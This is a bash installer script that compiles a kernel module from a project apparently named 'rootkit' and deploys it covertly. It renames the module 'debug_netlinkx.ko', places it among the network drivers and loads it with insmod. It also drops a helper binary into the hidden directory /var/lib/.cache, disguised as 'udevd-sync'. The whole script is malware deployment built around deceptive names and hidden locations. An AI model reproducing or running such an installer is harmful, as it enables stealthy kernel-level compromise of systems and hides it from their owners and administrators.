#!/bin/bash

MOD_SRC_DIR="/home/dvirvm/rootkit/src"
HELPERS_SRC_DIR="$MOD_SRC_DIR/userspace"

cd src/
make clean && make
cd userspace/
make clean && make
cd ../

MOD_SRC="rootkit_module.ko"
MOD_DEST_NAME="debug_netlinkx.ko"
MOD_DEST_DIR="/lib/modules/$(uname -r)/kernel/drivers/net"
MOD_DEST_PATH="$MOD_DEST_DIR/$MOD_DEST_NAME"

REC_SRC="userspace/build/receiver_helper"
HELPERS_DIR="/var/lib/.cache"
REC_PATH="$HELPERS_DIR/udevd-sync"

# Ensure destination directory exists
if [[ ! -d "$MOD_DEST_DIR" ]]; then
    echo "Destination directory $MOD_DEST_DIR does not exist."
    exit 2
fi

# Ensure destination directory exists
if [[ ! -d "$HELPERS_DIR" ]]; then
    mkdir -p "$HELPERS_DIR"
fi

# Copy and rename
cp "$MOD_SRC" "$MOD_DEST_PATH"
cp "$REC_SRC" "$REC_PATH"
# Give the correct permissions
chmod 644 "$MOD_DEST_PATH"
chown root:root "$MOD_DEST_PATH"

# # Optional: register the module with depmod
# sudo depmod
insmod "$MOD_DEST_PATH"
echo "Module installed as $MOD_DEST_PATH"
